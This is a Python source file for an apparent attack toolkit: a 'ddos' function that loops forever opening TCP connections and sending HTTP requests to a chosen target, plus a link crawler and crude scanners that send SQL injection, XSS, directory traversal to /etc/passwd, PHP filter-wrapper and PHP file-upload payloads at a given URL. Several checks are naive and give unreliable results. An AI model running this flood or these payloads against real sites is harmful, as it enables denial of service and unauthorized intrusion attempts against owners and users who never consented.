import socket
from rich import print as rprint
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import requests
import os
import re
import requests

attack_num = 0


def ddos(target: str, port: int):
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                target_ip = socket.gethostbyname(target)
                s.connect((target_ip, port))
                s.send(("GET / HTTP/1.1\r\n").encode('ascii'))
                s.send(("Host: " + target + "\r\n\r\n").encode('ascii'))

                global attack_num
                attack_num += 1
                rprint(f"[bold red]Attack Number: {attack_num}[/bold red]")

        except socket.gaierror as e:
            rprint(
                f"[bold red]Failed to resolve hostname {target}:[/bold red] {e}")
            break
        except Exception as e:
            rprint(f"[bold red]Error in DDoS attack:[/bold red] {e}")
            break


def discover_urls(url):
    discovered_urls = []

    # Send a GET request to the given URL
    response = requests.get(url)
    if response.status_code == 200:
        # Parse the HTML content of the response
        soup = BeautifulSoup(response.text, "html.parser")

        # Find all anchor tags and extract URLs
        for anchor_tag in soup.find_all("a"):
            href = anchor_tag.get("href")
            if href:
                absolute_url = urljoin(url, href)
                discovered_urls.append(absolute_url)

    return discovered_urls


def check_vulnerabilities(url, sql, xss, conf, dirtv, rcev, fuv):
    if sql:
        rprint(
            f"[bold red]SQL injection: {is_sql_injection_vulnerable(url)}[/bold red]")
    if xss:
        rprint(f"[bold red]XSS: {is_xss_vulnerable(url)}[/bold red]")
    if conf:
        rprint(
            f"[bold red]Insecure configuration: {has_insecure_configuration(url)}[/bold red]")
    if dirtv:
        rprint(
            f"[bold red]Directory tranversal: {is_directory_traversal_vulnerable(url)}[/bold red]")
    if rcev:
        rprint(
            f"[bold red]Remote code execution: {is_remote_code_execution_vulnerable(url)}[/bold red]")
    if fuv:
        rprint(
            f"[bold red]File upload vulnerable: {is_file_upload_vulnerable(url)}[/bold red]")
    if not (sql or xss or conf or dirtv or rcev or fuv):
        rprint("[white bold]No vulnerabilities checked.[/white bold]")


def is_sql_injection_vulnerable(url):
    # Perform checks for SQL injection vulnerability
    # Example: Send a malicious SQL query and check the response
    payload = "' OR '1'='1"
    response = requests.get(url + "?id=" + payload)
    if re.search(r"error|warning", response.text, re.IGNORECASE):
        return True
    return False


def is_xss_vulnerable(url):
    # Perform checks for cross-site scripting (XSS) vulnerability
    # Example: Inject a script tag and check if it gets executed
    payload = "<script>alert('XSS')</script>"
    response = requests.get(url + "?input=" + payload)
    if payload in response.text:
        return True
    return False


def has_insecure_configuration(url):
    # Perform checks for insecure server configuration
    # Example: Check if the website uses HTTP instead of HTTPS
    if not url.startswith("https"):
        return True
    return False


def is_directory_traversal_vulnerable(url):
    # Attempt to access a file outside of the web root directory
    test_path = "../../../../../../../../etc/passwd"
    response = requests.get(url + "/" + test_path)
    if "root:" in response.text:
        return True
    return False


def is_remote_code_execution_vulnerable(url):
    # Check if certain server-side functionality allows code execution
    # Example: If there's a PHP file inclusion vulnerability
    test_payload = "php://filter/convert.base64-encode/resource=index"
    response = requests.get(url + "?page=" + test_payload)
    if "base64" in response.text:
        return True
    return False


def is_file_upload_vulnerable(url):
    test_file_path = 'test.php'
    if os.path.exists(test_file_path):
        try:
            files = {'file': open(test_file_path, 'rb')}
            response = requests.post(url, files=files)
            if response.status_code == 200:
                return True
            else:
                return False
        except Exception as e:
            rprint(
                f"[bold red]Error occurred while testing file upload vulnerability: {e} [/bold red]")
            return False
    else:
        rprint(f"[bold red]Test file '{test_file_path}' not found.[/bold red]")
        return False
